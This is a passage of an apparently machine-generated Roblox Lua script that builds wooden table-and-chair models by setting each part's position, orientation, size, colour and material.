        Part357.Anchored = true
        Part357.BottomSurface = Enum.SurfaceType.Smooth
        Part357.BrickColor = BrickColor.new("Reddish brown")
        Part357.Material = Enum.Material.Wood
        Part357.TopSurface = Enum.SurfaceType.Smooth
        Part357.brickColor = BrickColor.new("Reddish brown")
        Part358.Parent = Model347
        Part358.CFrame = CFrame.new(-8.19988251, 11856.251, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part358.Orientation = Vector3.new(0, 180, 0)
        Part358.Position = Vector3.new(-8.199882507324219, 11856.2509765625, -27.599987030029297)
        Part358.Rotation = Vector3.new(-180, 0, -180)
        Part358.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part358.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part358.Anchored = true
        Part358.BottomSurface = Enum.SurfaceType.Smooth
        Part358.BrickColor = BrickColor.new("Reddish brown")
        Part358.Material = Enum.Material.Wood
        Part358.TopSurface = Enum.SurfaceType.Smooth
        Part358.brickColor = BrickColor.new("Reddish brown")
        Part359.Parent = Model347
        Part359.CFrame = CFrame.new(-5.99990606, 11854.6504, -28.6999397, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part359.Orientation = Vector3.new(0, 180, 0)
        Part359.Position = Vector3.new(-5.999906063079834, 11854.650390625, -28.699939727783203)
        Part359.Rotation = Vector3.new(-180, 0, -180)
        Part359.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part359.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part359.Anchored = true
        Part359.BottomSurface = Enum.SurfaceType.Smooth
        Part359.BrickColor = BrickColor.new("Reddish brown")
        Part359.Material = Enum.Material.Wood
        Part359.TopSurface = Enum.SurfaceType.Smooth
        Part359.brickColor = BrickColor.new("Reddish brown")
        Part360.Parent = Model347
        Part360.CFrame = CFrame.new(-7.09989357, 11855.4502, -27.5999851, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part360.Orientation = Vector3.new(0, 180, 0)
        Part360.Position = Vector3.new(-7.099893569946289, 11855.4501953125, -27.599985122680664)
        Part360.Rotation = Vector3.new(-180, 0, -180)
        Part360.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part360.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part360.Anchored = true
        Part360.BottomSurface = Enum.SurfaceType.Smooth
        Part360.BrickColor = BrickColor.new("Reddish brown")
        Part360.Material = Enum.Material.Wood
        Part360.TopSurface = Enum.SurfaceType.Smooth
        Part360.brickColor = BrickColor.new("Reddish brown")
        Part361.Parent = Model347
        Part361.CFrame = CFrame.new(-8.19988537, 11854.6504, -28.6999454, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part361.Orientation = Vector3.new(0, 180, 0)
        Part361.Position = Vector3.new(-8.199885368347168, 11854.650390625, -28.6999454498291)
        Part361.Rotation = Vector3.new(-180, 0, -180)
        Part361.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part361.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part361.Anchored = true
        Part361.BottomSurface = Enum.SurfaceType.Smooth
        Part361.BrickColor = BrickColor.new("Reddish brown")
        Part361.Material = Enum.Material.Wood
        Part361.TopSurface = Enum.SurfaceType.Smooth
        Part361.brickColor = BrickColor.new("Reddish brown")
        Model362.Name = "Table"
        Model362.Parent = Model0
        Model363.Name = "Chair"
        Model363.Parent = Model362
        Part364.Parent = Model363
        Part364.CFrame = CFrame.new(-10.699995, 11854.6504, -19.9999828, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part364.Orientation = Vector3.new(0, 90, 0)
        Part364.Position = Vector3.new(-10.699995040893555, 11854.650390625, -19.999982833862305)
        Part364.Rotation = Vector3.new(0, 90, 0)
        Part364.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part364.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part364.Anchored = true
        Part364.BottomSurface = Enum.SurfaceType.Smooth
        Part364.BrickColor = BrickColor.new("Reddish brown")
        Part364.Material = Enum.Material.Wood
        Part364.TopSurface = Enum.SurfaceType.Smooth
        Part364.brickColor = BrickColor.new("Reddish brown")
        Seat365.Parent = Model363
        Seat365.CFrame = CFrame.new(-9.60000801, 11855.4502, -21.0999889, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Seat365.Orientation = Vector3.new(0, 180, 0)
        Seat365.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -21.09998893737793)
        Seat365.Rotation = Vector3.new(-180, 0, -180)
        Seat365.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat365.Transparency = 1
        Seat365.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat365.Anchored = true
        Seat365.BottomSurface = Enum.SurfaceType.Smooth
        Seat365.BrickColor = BrickColor.new("Reddish brown")
        Seat365.Material = Enum.Material.Wood
        Seat365.TopSurface = Enum.SurfaceType.Smooth
        Seat365.brickColor = BrickColor.new("Reddish brown")
        Part366.Parent = Model363
        Part366.CFrame = CFrame.new(-9.60000801, 11855.8506, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part366.Orientation = Vector3.new(0, 90, 0)
        Part366.Position = Vector3.new(-9.600008010864258, 11855.8505859375, -22.199995040893555)
        Part366.Rotation = Vector3.new(0, 90, 0)
        Part366.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part366.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part366.Anchored = true
        Part366.BottomSurface = Enum.SurfaceType.Smooth
        Part366.BrickColor = BrickColor.new("Reddish brown")
        Part366.Material = Enum.Material.Wood
        Part366.TopSurface = Enum.SurfaceType.Smooth
        Part366.brickColor = BrickColor.new("Reddish brown")
        Part367.Parent = Model363
        Part367.CFrame = CFrame.new(-9.60000801, 11857.0498, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part367.Orientation = Vector3.new(0, 90, 0)
        Part367.Position = Vector3.new(-9.600008010864258, 11857.0498046875, -22.199995040893555)
        Part367.Rotation = Vector3.new(0, 90, 0)
        Part367.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part367.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part367.Anchored = true
        Part367.BottomSurface = Enum.SurfaceType.Smooth
        Part367.BrickColor = BrickColor.new("Reddish brown")
        Part367.Material = Enum.Material.Wood
        Part367.TopSurface = Enum.SurfaceType.Smooth
        Part367.brickColor = BrickColor.new("Reddish brown")
        Part368.Parent = Model363
        Part368.CFrame = CFrame.new(-9.60000801, 11856.6504, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part368.Orientation = Vector3.new(0, 90, 0)
        Part368.Position = Vector3.new(-9.600008010864258, 11856.650390625, -22.199995040893555)
        Part368.Rotation = Vector3.new(0, 90, 0)
        Part368.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part368.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part368.Anchored = true
        Part368.BottomSurface = Enum.SurfaceType.Smooth
        Part368.BrickColor = BrickColor.new("Reddish brown")
        Part368.Material = Enum.Material.Wood
        Part368.TopSurface = Enum.SurfaceType.Smooth
        Part368.brickColor = BrickColor.new("Reddish brown")
        Part369.Parent = Model363
        Part369.CFrame = CFrame.new(-9.60000801, 11857.4502, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part369.Orientation = Vector3.new(0, 90, 0)
        Part369.Position = Vector3.new(-9.600008010864258, 11857.4501953125, -22.199995040893555)
        Part369.Rotation = Vector3.new(0, 90, 0)
        Part369.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part369.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part369.Anchored = true
        Part369.BottomSurface = Enum.SurfaceType.Smooth
        Part369.BrickColor = BrickColor.new("Reddish brown")
        Part369.Material = Enum.Material.Wood
        Part369.TopSurface = Enum.SurfaceType.Smooth
        Part369.brickColor = BrickColor.new("Reddish brown")
        Part370.Parent = Model363
        Part370.CFrame = CFrame.new(-9.60000801, 11857.8506, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part370.Orientation = Vector3.new(0, 90, 0)
        Part370.Position = Vector3.new(-9.600008010864258, 11857.8505859375, -22.199995040893555)
        Part370.Rotation = Vector3.new(0, 90, 0)
        Part370.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part370.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part370.Anchored = true
        Part370.BottomSurface = Enum.SurfaceType.Smooth
        Part370.BrickColor = BrickColor.new("Reddish brown")
        Part370.Material = Enum.Material.Wood
        Part370.TopSurface = Enum.SurfaceType.Smooth
        Part370.brickColor = BrickColor.new("Reddish brown")
        Part371.Parent = Model363
        Part371.CFrame = CFrame.new(-10.699995, 11856.751, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part371.Orientation = Vector3.new(0, 90, 0)
        Part371.Position = Vector3.new(-10.699995040893555, 11856.7509765625, -22.199995040893555)
        Part371.Rotation = Vector3.new(0, 90, 0)
        Part371.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part371.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part371.Anchored = true
        Part371.BottomSurface = Enum.SurfaceType.Smooth
        Part371.BrickColor = BrickColor.new("Reddish brown")
        Part371.Material = Enum.Material.Wood
        Part371.TopSurface = Enum.SurfaceType.Smooth
        Part371.brickColor = BrickColor.new("Reddish brown")
        Part372.Parent = Model363
        Part372.CFrame = CFrame.new(-8.50000381, 11856.751, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part372.Orientation = Vector3.new(0, 90, 0)
        Part372.Position = Vector3.new(-8.500003814697266, 11856.7509765625, -22.199995040893555)
        Part372.Rotation = Vector3.new(0, 90, 0)
        Part372.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part372.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part372.Anchored = true
        Part372.BottomSurface = Enum.SurfaceType.Smooth
        Part372.BrickColor = BrickColor.new("Reddish brown")
        Part372.Material = Enum.Material.Wood
        Part372.TopSurface = Enum.SurfaceType.Smooth
        Part372.brickColor = BrickColor.new("Reddish brown")
        Part373.Parent = Model363
        Part373.CFrame = CFrame.new(-10.699995, 11854.6504, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part373.Orientation = Vector3.new(0, 90, 0)
        Part373.Position = Vector3.new(-10.699995040893555, 11854.650390625, -22.199995040893555)
        Part373.Rotation = Vector3.new(0, 90, 0)
        Part373.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part373.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part373.Anchored = true
        Part373.BottomSurface = Enum.SurfaceType.Smooth
        Part373.BrickColor = BrickColor.new("Reddish brown")
        Part373.Material = Enum.Material.Wood
        Part373.TopSurface = Enum.SurfaceType.Smooth
        Part373.brickColor = BrickColor.new("Reddish brown")
        Part374.Parent = Model363
        Part374.CFrame = CFrame.new(-9.60000801, 11856.251, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part374.Orientation = Vector3.new(0, 90, 0)
        Part374.Position = Vector3.new(-9.600008010864258, 11856.2509765625, -22.199995040893555)
        Part374.Rotation = Vector3.new(0, 90, 0)
        Part374.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part374.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part374.Anchored = true
        Part374.BottomSurface = Enum.SurfaceType.Smooth
        Part374.BrickColor = BrickColor.new("Reddish brown")
        Part374.Material = Enum.Material.Wood
        Part374.TopSurface = Enum.SurfaceType.Smooth
        Part374.brickColor = BrickColor.new("Reddish brown")
        Part375.Parent = Model363
        Part375.CFrame = CFrame.new(-8.50000381, 11854.6504, -19.9999828, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part375.Orientation = Vector3.new(0, 90, 0)
        Part375.Position = Vector3.new(-8.500003814697266, 11854.650390625, -19.999982833862305)
        Part375.Rotation = Vector3.new(0, 90, 0)
        Part375.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part375.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part375.Anchored = true
        Part375.BottomSurface = Enum.SurfaceType.Smooth
        Part375.BrickColor = BrickColor.new("Reddish brown")
        Part375.Material = Enum.Material.Wood
        Part375.TopSurface = Enum.SurfaceType.Smooth
        Part375.brickColor = BrickColor.new("Reddish brown")
        Part376.Parent = Model363
        Part376.CFrame = CFrame.new(-9.60000801, 11855.4502, -21.0999889, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part376.Orientation = Vector3.new(0, 90, 0)
        Part376.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -21.09998893737793)
        Part376.Rotation = Vector3.new(0, 90, 0)
        Part376.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part376.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part376.Anchored = true
        Part376.BottomSurface = Enum.SurfaceType.Smooth
        Part376.BrickColor = BrickColor.new("Reddish brown")
        Part376.Material = Enum.Material.Wood
        Part376.TopSurface = Enum.SurfaceType.Smooth
        Part376.brickColor = BrickColor.new("Reddish brown")
        Part377.Parent = Model363
        Part377.CFrame = CFrame.new(-8.50000381, 11854.6504, -22.199995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part377.Orientation = Vector3.new(0, 90, 0)
        Part377.Position = Vector3.new(-8.500003814697266, 11854.650390625, -22.199995040893555)
        Part377.Rotation = Vector3.new(0, 90, 0)
        Part377.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part377.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part377.Anchored = true
        Part377.BottomSurface = Enum.SurfaceType.Smooth
        Part377.BrickColor = BrickColor.new("Reddish brown")
        Part377.Material = Enum.Material.Wood
        Part377.TopSurface = Enum.SurfaceType.Smooth
        Part377.brickColor = BrickColor.new("Reddish brown")
        Model378.Name = "Table"
        Model378.Parent = Model362
        Part379.Parent = Model378
        Part379.CFrame = CFrame.new(-10.699995, 11855.1504, -19.399992, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part379.Orientation = Vector3.new(0, 90, 0)
        Part379.Position = Vector3.new(-10.699995040893555, 11855.150390625, -19.399991989135742)
        Part379.Rotation = Vector3.new(0, 90, 0)
        Part379.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part379.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part379.Anchored = true
        Part379.BottomSurface = Enum.SurfaceType.Smooth
        Part379.BrickColor = BrickColor.new("Reddish brown")
        Part379.Material = Enum.Material.Wood
        Part379.TopSurface = Enum.SurfaceType.Smooth
        Part379.brickColor = BrickColor.new("Reddish brown")
        Part380.Parent = Model378
        Part380.CFrame = CFrame.new(-10.699995, 11855.1504, -16.399992, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part380.Orientation = Vector3.new(0, 90, 0)
        Part380.Position = Vector3.new(-10.699995040893555, 11855.150390625, -16.399991989135742)
        Part380.Rotation = Vector3.new(0, 90, 0)
        Part380.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part380.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part380.Anchored = true
        Part380.BottomSurface = Enum.SurfaceType.Smooth
        Part380.BrickColor = BrickColor.new("Reddish brown")
        Part380.Material = Enum.Material.Wood
        Part380.TopSurface = Enum.SurfaceType.Smooth
        Part380.brickColor = BrickColor.new("Reddish brown")
        Part381.Parent = Model378
        Part381.CFrame = CFrame.new(-8.50000381, 11855.1504, -19.399992, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part381.Orientation = Vector3.new(0, 90, 0)
        Part381.Position = Vector3.new(-8.500003814697266, 11855.150390625, -19.399991989135742)
        Part381.Rotation = Vector3.new(0, 90, 0)
        Part381.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part381.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part381.Anchored = true
        Part381.BottomSurface = Enum.SurfaceType.Smooth
        Part381.BrickColor = BrickColor.new("Reddish brown")
        Part381.Material = Enum.Material.Wood
        Part381.TopSurface = Enum.SurfaceType.Smooth
        Part381.brickColor = BrickColor.new("Reddish brown")
        Part382.Parent = Model378
        Part382.CFrame = CFrame.new(-8.50000381, 11855.1504, -16.399992, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part382.Orientation = Vector3.new(0, 90, 0)
        Part382.Position = Vector3.new(-8.500003814697266, 11855.150390625, -16.399991989135742)
        Part382.Rotation = Vector3.new(0, 90, 0)
        Part382.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part382.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part382.Anchored = true
        Part382.BottomSurface = Enum.SurfaceType.Smooth
        Part382.BrickColor = BrickColor.new("Reddish brown")
        Part382.Material = Enum.Material.Wood
        Part382.TopSurface = Enum.SurfaceType.Smooth
        Part382.brickColor = BrickColor.new("Reddish brown")
        Part383.Parent = Model378
        Part383.CFrame = CFrame.new(-9.60000801, 11856.6504, -17.899992, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part383.Orientation = Vector3.new(0, 90, 0)
        Part383.Position = Vector3.new(-9.600008010864258, 11856.650390625, -17.899991989135742)
        Part383.Rotation = Vector3.new(0, 90, 0)
        Part383.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part383.Size = Vector3.new(3.200000047683716, 0.5999999046325684, 2.4000000953674316)
        Part383.Anchored = true
        Part383.BottomSurface = Enum.SurfaceType.Smooth
        Part383.BrickColor = BrickColor.new("Reddish brown")
        Part383.Material = Enum.Material.Wood
        Part383.TopSurface = Enum.SurfaceType.Smooth
        Part383.brickColor = BrickColor.new("Reddish brown")
        Model384.Name = "Chair"
        Model384.Parent = Model362
        Part385.Parent = Model384
        Part385.CFrame = CFrame.new(-8.50000381, 11854.6504, -15.8000021, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part385.Orientation = Vector3.new(0, -90, 0)
        Part385.Position = Vector3.new(-8.500003814697266, 11854.650390625, -15.800002098083496)
        Part385.Rotation = Vector3.new(0, -90, 0)
        Part385.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part385.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part385.Anchored = true
        Part385.BottomSurface = Enum.SurfaceType.Smooth
        Part385.BrickColor = BrickColor.new("Reddish brown")
        Part385.Material = Enum.Material.Wood
        Part385.TopSurface = Enum.SurfaceType.Smooth
        Part385.brickColor = BrickColor.new("Reddish brown")
        Seat386.Parent = Model384
        Seat386.CFrame = CFrame.new(-9.60000801, 11855.4502, -14.699996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Seat386.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -14.699995994567871)
        Seat386.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat386.Transparency = 1
        Seat386.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat386.Anchored = true
        Seat386.BottomSurface = Enum.SurfaceType.Smooth
        Seat386.BrickColor = BrickColor.new("Reddish brown")
        Seat386.Material = Enum.Material.Wood
        Seat386.TopSurface = Enum.SurfaceType.Smooth
        Seat386.brickColor = BrickColor.new("Reddish brown")
        Part387.Parent = Model384
        Part387.CFrame = CFrame.new(-9.60000801, 11855.8506, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part387.Orientation = Vector3.new(0, -90, 0)
        Part387.Position = Vector3.new(-9.600008010864258, 11855.8505859375, -13.599989891052246)
        Part387.Rotation = Vector3.new(0, -90, 0)
        Part387.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part387.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part387.Anchored = true
        Part387.BottomSurface = Enum.SurfaceType.Smooth
        Part387.BrickColor = BrickColor.new("Reddish brown")
        Part387.Material = Enum.Material.Wood
        Part387.TopSurface = Enum.SurfaceType.Smooth
        Part387.brickColor = BrickColor.new("Reddish brown")
        Part388.Parent = Model384
        Part388.CFrame = CFrame.new(-9.60000801, 11857.0498, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part388.Orientation = Vector3.new(0, -90, 0)
        Part388.Position = Vector3.new(-9.600008010864258, 11857.0498046875, -13.599989891052246)
        Part388.Rotation = Vector3.new(0, -90, 0)
        Part388.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part388.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part388.Anchored = true
        Part388.BottomSurface = Enum.SurfaceType.Smooth
        Part388.BrickColor = BrickColor.new("Reddish brown")
        Part388.Material = Enum.Material.Wood
        Part388.TopSurface = Enum.SurfaceType.Smooth
        Part388.brickColor = BrickColor.new("Reddish brown")
        Part389.Parent = Model384
        Part389.CFrame = CFrame.new(-9.60000801, 11856.6504, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part389.Orientation = Vector3.new(0, -90, 0)
        Part389.Position = Vector3.new(-9.600008010864258, 11856.650390625, -13.599989891052246)
        Part389.Rotation = Vector3.new(0, -90, 0)
        Part389.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part389.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part389.Anchored = true
        Part389.BottomSurface = Enum.SurfaceType.Smooth
        Part389.BrickColor = BrickColor.new("Reddish brown")
        Part389.Material = Enum.Material.Wood
        Part389.TopSurface = Enum.SurfaceType.Smooth
        Part389.brickColor = BrickColor.new("Reddish brown")
        Part390.Parent = Model384
        Part390.CFrame = CFrame.new(-9.60000801, 11857.4502, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part390.Orientation = Vector3.new(0, -90, 0)
        Part390.Position = Vector3.new(-9.600008010864258, 11857.4501953125, -13.599989891052246)
        Part390.Rotation = Vector3.new(0, -90, 0)
        Part390.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part390.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part390.Anchored = true
        Part390.BottomSurface = Enum.SurfaceType.Smooth
        Part390.BrickColor = BrickColor.new("Reddish brown")
        Part390.Material = Enum.Material.Wood
        Part390.TopSurface = Enum.SurfaceType.Smooth
        Part390.brickColor = BrickColor.new("Reddish brown")
        Part391.Parent = Model384
        Part391.CFrame = CFrame.new(-9.60000801, 11857.8506, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part391.Orientation = Vector3.new(0, -90, 0)
        Part391.Position = Vector3.new(-9.600008010864258, 11857.8505859375, -13.599989891052246)
        Part391.Rotation = Vector3.new(0, -90, 0)
        Part391.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part391.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part391.Anchored = true
        Part391.BottomSurface = Enum.SurfaceType.Smooth
        Part391.BrickColor = BrickColor.new("Reddish brown")
        Part391.Material = Enum.Material.Wood
        Part391.TopSurface = Enum.SurfaceType.Smooth
        Part391.brickColor = BrickColor.new("Reddish brown")
        Part392.Parent = Model384
        Part392.CFrame = CFrame.new(-8.50000381, 11856.751, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part392.Orientation = Vector3.new(0, -90, 0)
        Part392.Position = Vector3.new(-8.500003814697266, 11856.7509765625, -13.599989891052246)
        Part392.Rotation = Vector3.new(0, -90, 0)
        Part392.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part392.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part392.Anchored = true
        Part392.BottomSurface = Enum.SurfaceType.Smooth
        Part392.BrickColor = BrickColor.new("Reddish brown")
        Part392.Material = Enum.Material.Wood
        Part392.TopSurface = Enum.SurfaceType.Smooth
        Part392.brickColor = BrickColor.new("Reddish brown")
        Part393.Parent = Model384
        Part393.CFrame = CFrame.new(-10.699995, 11856.751, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part393.Orientation = Vector3.new(0, -90, 0)
        Part393.Position = Vector3.new(-10.699995040893555, 11856.7509765625, -13.599989891052246)
        Part393.Rotation = Vector3.new(0, -90, 0)
        Part393.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part393.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part393.Anchored = true
        Part393.BottomSurface = Enum.SurfaceType.Smooth
        Part393.BrickColor = BrickColor.new("Reddish brown")
        Part393.Material = Enum.Material.Wood
        Part393.TopSurface = Enum.SurfaceType.Smooth
        Part393.brickColor = BrickColor.new("Reddish brown")
        Part394.Parent = Model384
        Part394.CFrame = CFrame.new(-8.50000381, 11854.6504, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part394.Orientation = Vector3.new(0, -90, 0)
        Part394.Position = Vector3.new(-8.500003814697266, 11854.650390625, -13.599989891052246)
        Part394.Rotation = Vector3.new(0, -90, 0)
        Part394.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part394.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part394.Anchored = true
        Part394.BottomSurface = Enum.SurfaceType.Smooth
        Part394.BrickColor = BrickColor.new("Reddish brown")
        Part394.Material = Enum.Material.Wood
        Part394.TopSurface = Enum.SurfaceType.Smooth
        Part394.brickColor = BrickColor.new("Reddish brown")
        Part395.Parent = Model384
        Part395.CFrame = CFrame.new(-9.60000801, 11856.251, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part395.Orientation = Vector3.new(0, -90, 0)
        Part395.Position = Vector3.new(-9.600008010864258, 11856.2509765625, -13.599989891052246)
        Part395.Rotation = Vector3.new(0, -90, 0)
        Part395.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part395.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part395.Anchored = true
        Part395.BottomSurface = Enum.SurfaceType.Smooth
        Part395.BrickColor = BrickColor.new("Reddish brown")
        Part395.Material = Enum.Material.Wood
        Part395.TopSurface = Enum.SurfaceType.Smooth
        Part395.brickColor = BrickColor.new("Reddish brown")
        Part396.Parent = Model384
        Part396.CFrame = CFrame.new(-10.699995, 11854.6504, -15.8000021, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part396.Orientation = Vector3.new(0, -90, 0)
        Part396.Position = Vector3.new(-10.699995040893555, 11854.650390625, -15.800002098083496)
        Part396.Rotation = Vector3.new(0, -90, 0)
        Part396.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part396.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part396.Anchored = true
        Part396.BottomSurface = Enum.SurfaceType.Smooth
        Part396.BrickColor = BrickColor.new("Reddish brown")
        Part396.Material = Enum.Material.Wood
        Part396.TopSurface = Enum.SurfaceType.Smooth
        Part396.brickColor = BrickColor.new("Reddish brown")
        Part397.Parent = Model384
        Part397.CFrame = CFrame.new(-9.60000801, 11855.4502, -14.699996, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part397.Orientation = Vector3.new(0, -90, 0)
        Part397.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -14.699995994567871)
        Part397.Rotation = Vector3.new(0, -90, 0)
        Part397.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part397.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part397.Anchored = true
        Part397.BottomSurface = Enum.SurfaceType.Smooth
        Part397.BrickColor = BrickColor.new("Reddish brown")
        Part397.Material = Enum.Material.Wood
        Part397.TopSurface = Enum.SurfaceType.Smooth
        Part397.brickColor = BrickColor.new("Reddish brown")
        Part398.Parent = Model384
        Part398.CFrame = CFrame.new(-10.699995, 11854.6504, -13.5999899, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part398.Orientation = Vector3.new(0, -90, 0)
        Part398.Position = Vector3.new(-10.699995040893555, 11854.650390625, -13.599989891052246)
        Part398.Rotation = Vector3.new(0, -90, 0)
        Part398.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part398.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part398.Anchored = true
        Part398.BottomSurface = Enum.SurfaceType.Smooth
        Part398.BrickColor = BrickColor.new("Reddish brown")
        Part398.Material = Enum.Material.Wood
        Part398.TopSurface = Enum.SurfaceType.Smooth
        Part398.brickColor = BrickColor.new("Reddish brown")
        Model399.Name = "Table"
        Model399.Parent = Model0
        Model400.Name = "Chair"
        Model400.Parent = Model399
        Part401.Parent = Model400
        Part401.CFrame = CFrame.new(-1.89999652, 11854.6504, -20.0999947, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part401.Orientation = Vector3.new(0, 90, 0)
        Part401.Position = Vector3.new(-1.8999965190887451, 11854.650390625, -20.099994659423828)
        Part401.Rotation = Vector3.new(0, 90, 0)
        Part401.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part401.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part401.Anchored = true
        Part401.BottomSurface = Enum.SurfaceType.Smooth
        Part401.BrickColor = BrickColor.new("Reddish brown")
        Part401.Material = Enum.Material.Wood
        Part401.TopSurface = Enum.SurfaceType.Smooth
        Part401.brickColor = BrickColor.new("Reddish brown")
        Seat402.Parent = Model400
